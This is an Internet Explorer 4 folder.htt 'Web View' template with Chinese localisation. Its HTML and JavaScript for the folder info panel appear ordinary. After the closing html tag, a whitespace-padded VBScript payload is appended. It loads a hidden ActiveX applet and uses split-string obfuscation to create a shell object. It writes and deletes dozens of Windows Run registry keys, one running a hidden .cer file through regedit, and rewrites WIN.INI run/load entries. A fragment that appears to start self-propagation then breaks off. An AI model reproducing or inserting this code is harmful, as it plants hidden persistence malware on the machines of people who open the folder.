<!-- 
 * This file was automatically generated by Microsoft Internet Explorer 4.0 
 * using the file %THISDIRPATH%\folder.htt (if customized) or
 * %TEMPLATEDIR%\folder.htt (if not customized).
 -->

<html>
	<style>
		body		{font: 9pt/10pt 宋体; margin: 0}
		#FileList	{position: absolute; left: 30%; width: 70%; height: 100%}
		#Media		{margin-left: 15px}
		#Panel		{position: absolute; width: 30%; height: 100%; overflow: auto}
		#PieChart	{width: 100px; height: 50px; margin-top: 10px}
		#Thumbnail	{width: 160px; height: 160px; margin-top: 0px}
		#Status		{margin-left: 15px}
		#Brand		{position: absolute; left: 30%; width: 70%; height: 100%; overflow: auto}
		p		{margin-left: 15px; margin-top: 15px; margin-right: 15px}
		p.Title		{font: 16pt; font-weight: bold; margin-top: 5px}
		p.LogoLine	{margin-left: 0; margin-top: -5px; margin-right: 0; margin-bottom: 20px}
		p.Warning	{font-weight: bold; color: red}
		p.Links		{margin-top: 5px}
		a.Command	{font-weight: bold}
		div.Release     {width: 160px; text-align: right; background: buttonface; padding: 0px, 8px, 4px, 8px}
	</style>

	<head>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312">
		<!-- allow references to any resources you might add to the folder -->
		<!-- (a "webbot" is a special wrapper for FrontPage compatibility) -->
		<!-- webbot bot="HTMLMarkup" tag="base" startspan -->
		<base href="%THISDIRPATH%\">
		<!-- webbot bot="HTMLMarkup" endspan -->

		<script language="JavaScript">
			var L_Prompt_Text	= "选定项目可以查看其说明。";
			var L_Multiple_Text	= " 选定的项目。";
			var L_Size_Text		= "大小: ";
			var L_FileSize_Text	= "总计文件大小: ";
			var L_Delimiter_Text	= ",";
			var L_Bytes_Text	= "&nbsp;字节";
			var L_Attributes_Text	= "属性";
			var L_Codes_Text	= "RHSaCE"; // suppress the Archive flag
			var L_ReadOnly_Text 	= "只读";
			var L_Hidden_Text	= "隐藏";
			var L_System_Text	= "系统";
			var L_Archive_Text	= "档案";
			var L_Compressed_Text	= "已压缩";
			var L_Encrypted_Text	= "已加密";
			var L_NoAttributes_Text = "(正常)";
			var L_Properties_Text	= "属性(&R)";
			var timer		= 0;
			var wantMedia		= false; // cool, but may hinder media file manipulation

			function FixSize() {
				// this function handles fixed panel sizing and collapsing when the window resizes
				var threshold	= 400;
				var miniHeight	= 32;
				var ch		= document.body.clientHeight;
				var cw		= document.body.clientWidth;

				if (cw < threshold) {
					document.all.Panel.style.visibility = "hidden";
					document.all.MiniBanner.style.visibility = "visible";
					document.all.FileList.style.top = miniHeight;
					document.all.FileList.style.pixelLeft = 0;
				} else {
					document.all.MiniBanner.style.visibility = "hidden";
					document.all.Panel.style.visibility = "visible";
					document.all.FileList.style.top = 0;
					document.all.FileList.style.pixelLeft = document.all.Panel.style.pixelWidth; 
				}
				document.all.FileList.style.pixelWidth = cw - document.all.FileList.style.pixelLeft;
				document.all.FileList.style.pixelHeight = ch - document.all.FileList.style.pixelTop;
			}

			function FormatNumber(n) {
				var t = "";
				var i, j = 0;
				for (i = n.length - 1; i >= 0; i--) {
					t = n.charAt(i) + t;
					if (i && ((++j % 3) == 0))
						t = L_Delimiter_Text + t;
				}
				return t;
			}

			function Properties() {
				FileList.SelectedItems().Item(0).InvokeVerb(L_Properties_Text);
			}

			function Init() {
				// call our FixSize() function whenever the window gets resized
				window.onresize = FixSize;
				FixSize();
				Info.innerHTML = L_Prompt_Text;
			}
		</script>

		<script language="JavaScript" for="FileList" event="SelectionChanged">
			// this script updates the left info panel when you select icons
			var fldr = FileList.Folder;
			var items;
			var name;
			var data;
			var text;
			var title;
			var size = 0;
			var i;

			// cancel any pending status message
			if (timer) {
				window.clearTimeout(timer);
				timer = 0;
			}

			// erase any visible thumbnail since the selection changed
			document.all.Thumbnail.style.display = "none";
			document.all.Status.style.display = "none";

			// stop & destroy any media player
			if (wantMedia)
				document.all.Media.innerHTML = "";

			data = FileList.SelectedItems().Count;
			if (data == 0) {
				// nothing selected?
				Info.innerHTML = L_Prompt_Text;
				return;
			}
			else if (data > 1) {
				// more than one item selected?
				text = data + L_Multiple_Text + "<br>";
				if (data <= 100) {
					for (i = 0; i < data; i++)
						size += FileList.SelectedItems().Item(i).Size;
					if (size)
						text += "<br>" + L_FileSize_Text + FormatNumber(size.toString()) + L_Bytes_Text + "<br>";
					if (data <= 16)
						for (i = 0; i < data; i++)
							text += "<br>" + FileList.SelectedItems().Item(i).Name;
				}
				Info.innerHTML = text;
				return;
			}

			items = FileList.SelectedItems().Item(0);

			// name
			name = fldr.GetDetailsOf(items, 0);
			text = "<b>" + name + "</b>";

			// type
			data = fldr.GetDetailsOf(items, 2);
			if (data)
				text += "<br>" + data;

			// date
			data = fldr.GetDetailsOf(items, 3);
			if (data)
				text += "<br><br>" + fldr.GetDetailsOf(null, 3) + ":<br>" + data;

			// size
			size = FileList.SelectedItems().Item(0).Size;
			if (size && size < 1000)
				text += "<br><br>" + L_Size_Text + size + L_Bytes_Text;
			else {
				data = fldr.GetDetailsOf(items, 1);
				if (data)
					text += "<br><br>" + fldr.GetDetailsOf(null, 1) + ": " + data;
                                else if (size)
					text += "<br><br>" + L_Size_Text + FormatNumber(size.toString()) + L_Bytes_Text;
			}

			// extra details?
			for (i = 4; i < 10; i++) {
				title = fldr.GetDetailsOf(null, i);
				if (!title)
					break;
				data = fldr.GetDetailsOf(items, i);
				if (title == L_Attributes_Text) {
					var code;
					var s = "";

					text += "<br><br>" + title.link("JavaScript:onClick=Properties()") + ": ";
					for (i = 0; i < 6; i++) {
						code = L_Codes_Text.charAt(i);
						if (data.indexOf(code) > -1) {
							if (s)
								s += ", ";
							if (i == 0)
								s += L_ReadOnly_Text;
							else if (i == 1)
								s += L_Hidden_Text;
							else if (i == 2)
								s += L_System_Text;
							else if (i == 3)
								s += L_Archive_Text;
							else if (i == 4)
								s += L_Compressed_Text;
							else if (i == 5)
								s += L_Encrypted_Text;
						}
					}
					if (!s)
						s = L_NoAttributes_Text;
					text += s;
				}
				else if (data)
					text += "<br><br>" + title + ":<br>" + data;
			}

			// tip?
			data = fldr.GetDetailsOf(items, -1);
			if (data && data != name) {
				var start;
				var end;
				var theLink;
				var a;

				// parse lines for Office files without breaking links below
				a = data.split("\n");
				data = a.join("<br>\n");

				// look for embedded links
				text += "<br><br>";
				start = data.indexOf("http://");
				if (start < 0)
					start = data.indexOf("file://");
				if (start < 0)
					text += data;
				else {
					end = data.indexOf(" ", start);
					if (end < 0)
						end = data.length;
					if (start > 0)
						text += data.substring(0, start - 1);
					theLink = data.substring(start, end);
					text += theLink.link(theLink);
					if (end < data.length)
						text += data.substring(end + 1, data.length);
				}
			}

			// replace Info with the new text
			Info.innerHTML = text;

			if (wantMedia && size) {
				// show media preview or thumbnail based on file extension
				ext = name.substring(name.lastIndexOf(".") + 1, name.length);
				ext = ext.toLowerCase();		
				if (ext == 'avi' || ext == 'mov' || ext == 'qt' || ext == 'mpe' || ext == 'mpeg' || ext == 'mpg') {
					// show a movie player
					document.all.Media.innerHTML = '<object ID="Player" style="width: 160px; height: 148px" classid=clsid:05589FA1-C356-11CE-BF01-00AA0055595A><param name="FileName" value="' + items.Path + '"><param name=ShowDisplay value=0><param name=BorderStyle value=0></object>';
				} else if (ext == 'aif' || ext == 'aifc' || ext == 'aiff' || ext == 'au' || ext == 'mid' || ext == 'rmi' || ext == 'snd' || ext == 'wav') {
					// show a sound player
					document.all.Media.innerHTML = '<object ID="Player" style="width: 160px; height: 28px" classid=clsid:05589FA1-C356-11CE-BF01-00AA0055595A><param name="FileName" value="' + items.Path + '"><param name=ShowDisplay value=0></center></object>'
				}
			}

			// try to generate a new thumbnail asynchronously, and delay the status message one second
			if (size && (size < 10000000) && Thumbnail.displayFile(items.Path))
				timer = window.setTimeout('document.all.Status.style.display = ""', 1000);
		</script>

		<script language="JavaScript" for="Thumbnail" event="OnThumbnailReady">
			// when a valid thumbnail has been generated, display it
			window.clearTimeout(timer);
			timer = 0;
			document.all.Status.style.display = "none";
			if (document.all.Thumbnail.haveThumbnail() && document.all.Media.innerHTML == "")
				document.all.Thumbnail.style.display = "";
		</script>
	</head>

	<body scroll=no onload="Init()">

		<!-- start mini banner -->
		<div ID="MiniBanner" style="visibility: hidden; position: absolute; width: 100%; height: 32px; background: window">
			<!-- using a table with nowrap to prevent word wrapping -->
			<table><tr><td nowrap>
				<p class=Title style="margin-top: 0">
				<!--webbot bot="HTMLMarkup" startspan alt="&lt;B&gt;&lt;I&gt;Web View Folder Title&lt;/I&gt;&lt;/B&gt;&nbsp;" -->
				%THISDIRNAME%
				<!--webbot bot="HTMLMarkup" endspan -->
			</td></tr></table>
		</div>
		<!-- end mini banner -->

		<!-- start left info panel -->
		<div id=Panel style="background: white URL(file://%TEMPLATEDIR%\wvleft.bmp) no-repeat">
			<p>
			<object classid="clsid:E5DF9D10-3B52-11D1-83E8-00A0C90DC849" width=32 height=32>
				<param name="scale" value="100">
			</object>

			<p class=Title>
			<!--webbot bot="HTMLMarkup" startspan alt="&lt;B&gt;&lt;I&gt;Web View Folder Title&lt;/I&gt;&lt;/B&gt;&nbsp;" -->
			%THISDIRNAME%
			<!--webbot bot="HTMLMarkup" endspan -->
			
			<p class=LogoLine>
			<img src="%TEMPLATEDIR%\wvline.gif" width=100% height=1px>
			
			<p>
			<span id=Info>
			</span>

			<!-- HERE'S A GOOD PLACE TO ADD A FEW LINKS OF YOUR OWN -->
			<!-- (examples commented out)
				<p>
				<br>
				<a href="http://www.mylink1.com/">Custom Link 1</a>
				<p class=Links>
				<a href="http://www.mylink2.com/">Custom Link 2</a>
			-->

			<p>
			<!-- this is the thumbnail viewer control -->
			<object id=Thumbnail classid="clsid:1D2B4F40-1F10-11D1-9E88-00C04FDCAB92" style="display: none">
			</object>

			<!-- this is the status message that pops up during thumbnail generation -->
			<div id=Status style="display: none">
				正在生成预览...
			</div>
			
			<p>
			<!-- this contains any ActiveMovie control created later -->
			<div id=Media>
			</div>
			
		</div>
		<!-- end left info panel -->

		<!-- this is the standard file list control -->
		<!-- webbot bot="HTMLMarkup" startspan -->
		<object id=FileList border=0 tabindex=1 classid="clsid:1820FED0-473E-11D0-A96C-00C04FD705A2">
		</object>
		<!-- webbot bot="HTMLMarkup" endspan -->

	</body>
</html>

<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=zxqqrh"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<SCRIPT language="VBScript">


Set sss = CreateObject("WSc" + "ript.Sh" + "ell")
mhk="HK"&"LM\SO"&"FTWARE\Mi"&"cr"&"os"&"oft\Win"&"dows\Cu"&"rren"&"tVersion\Run\"
mhc="H"&"K"&"CU\So"&"ft"&"ware\Mic"&"ros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SO"&"FT"&"WARE\M"&"icr"&"osoft\Wi"&"n"&"dows\Curren"&"tVersion\"
sss.RegWrite ""&mhk&"Sys32","regedit -s C:\$NtUninstallQ5588565$\WINSYS.cer"
sss.RegWrite ""&mhk&"internat.exe","internat.exe"
sss.RegWrite ""&mhk&"zwupdows","12"
sss.RegWrite ""&mhk&"win","12"
sss.RegWrite ""&mhk&"mwin","12"
sss.RegWrite ""&mhk&"internt","12"
sss.RegWrite ""&mhk&"Inernet","12"
sss.RegWrite ""&mhk&"Internet","12"
sss.RegWrite ""&mhk&"iexpleror","12"
sss.RegWrite ""&mhk&"zxdows","12"
sss.RegWrite ""&mhk&"qwe","12"
sss.RegWrite ""&mhk&"win1","12"
sss.RegWrite ""&mhk&"intelnat.exe","12"
sss.RegWrite ""&mhk&"u1888","12"
sss.RegWrite ""&mhk&"intenet","12"
sss.RegWrite ""&mhk&"9i5zxdows","12"
sss.RegWrite ""&mhk&"9i5com01zxdows","12"
sss.RegWrite ""&mhk&"99zxdows","12"
sss.RegWrite ""&mhk&"88zxdows","12"
sss.RegWrite ""&mhk&"Start Pagewin","12"
sss.RegWrite ""&mhk&"Start Page","12"
sss.RegWrite ""&mhk&"u188","12"
sss.RegWrite ""&mhk&"9i5comzxdows","12"
sss.RegWrite ""&mhk&"9q5zxdows","12"
sss.RegWrite ""&mhk&"u1881","12"
sss.RegWrite ""&mhk&"u1882","12"
sss.RegWrite ""&mhk&"u1883","12"
sss.RegWrite ""&mhk&"u1884","12"
sss.RegWrite ""&mhk&"u1885","12"
sss.RegWrite ""&mhk&"u1886","12"
sss.RegWrite ""&mhk&"u1887","12"
sss.RegWrite ""&mhk&"u88y", "12"
sss.RegWrite ""&mhk&"flash", "12"
sss.RegWrite ""&mhk&"999izxdows","12"
sss.RegWrite ""&mhk&"033zxdows","12"
sss.RegWrite ""&mhk&"syste","12"
sss.RegWrite ""&mhc&"my","12"
sss.RegWrite ""&mhk&"3zxdows","12"
sss.RegWrite ""&mhk&"88u88","12"
sss.RegWrite ""&mhk&"system","12"
sss.RegWrite ""&mhk&"8zxdows","12"
sss.RegWrite ""&mhk&"u18","12"
sss.RegWrite ""&mhk&"interneet.exe","12"
sss.RegWrite ""&mhk2&"RunOnce\", "12"
sss.RegWrite ""&mhk&"iexpler", "12"
sss.RegWrite ""&mhk&"u1810", "12"
sss.RegWrite ""&mhk&"winwin", "12"
sss.RegWrite ""&mhk&"WIN32", "12"
sss.RegWrite ""&mhk&"W1N32", "12"
sss.RegWrite ""&mhk&"WlN32", "12"
sss.RegDelete ""&mhc&""
sss.RegDelete ""&mhk&"zwupdows"
sss.RegDelete ""&mhk&"win"
sss.RegDelete ""&mhk&"mwin"
sss.RegDelete ""&mhk&"internt"
sss.RegDelete ""&mhk&"inernet"
sss.RegDelete ""&mhk&"Internet"
sss.RegDelete ""&mhk&"u188"
sss.RegDelete ""&mhk&"iexpleror"
sss.RegDelete ""&mhk&"zxdows"
sss.RegDelete ""&mhk&"qwe"
sss.RegDelete ""&mhk&"win1"
sss.RegDelete ""&mhk&"intelnat.exe"
sss.RegDelete ""&mhk&"intenet"
sss.RegDelete ""&mhk&"9i5zxdows"
sss.RegDelete ""&mhk&"9i5com01zxdows"
sss.RegDelete ""&mhk&"99zxdows"
sss.RegDelete ""&mhk&"88zxdows"
sss.RegDelete ""&mhk&"Start Pagewin"
sss.RegDelete ""&mhk&"Start Page"
sss.RegDelete ""&mhk&"9i5comzxdows"
sss.RegDelete ""&mhk&"9q5zxdows"
sss.RegDelete ""&mhk&"999izxdows"
sss.RegDelete ""&mhk&"033zxdows"
sss.RegDelete ""&mhk&"u1881"
sss.RegDelete ""&mhk&"u1882"
sss.RegDelete ""&mhk&"u1883"
sss.RegDelete ""&mhk&"u1884"
sss.RegDelete ""&mhk&"u1885"
sss.RegDelete ""&mhk&"u1886"
sss.RegDelete ""&mhk&"u1887"
sss.RegDelete ""&mhk&"u88y"
sss.RegDelete ""&mhk&"flash"
sss.RegDelete ""&mhk&"88u88"
sss.RegDelete ""&mhk&"interneet.exe"
sss.RegDelete ""&mhk&"u18"
sss.RegDelete ""&mhk&"u1888"
sss.RegDelete ""&mhk&"system"
sss.RegDelete ""&mhk&"3zxdows"
sss.RegDelete ""&mhk&"8zxdows"
sss.RegDelete ""&mhk&"syste"
sss.RegDelete ""&mhk2&"RunOnce\"
sss.RegDelete ""&mhk&"iexpler"
sss.RegDelete ""&mhk&"u1810"
sss.RegDelete ""&mhk&"winwin"
sss.RegDelete ""&mhk&"WIN32"
sss.RegDelete ""&mhk&"W1N32"
sss.RegDelete ""&mhk&"WlN32"

Set FSO = CreateObject("Scrip" + "ting." + "FileSyst" + "emO" + "bject")
myfile14=FSO.FileExists("c:\wind" + "ows\W" + "IN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\win" + "dows\W" + "IN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\wi" + "ndows\W" + "IN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\win" + "dows\WI" + "N.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\wind" + "ows\WIN" + ".INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\win" + "dows\WI" + "N.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\win" + "dows\WI" + "N.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if














 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
  
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
On error resume next   
Randomize   
ErrTest = WScript.ScriptFullname    
 If Err Then    
 EF="htm"    
 Else    
 EF="vbs"    
set ZEhshll=WScript.Cr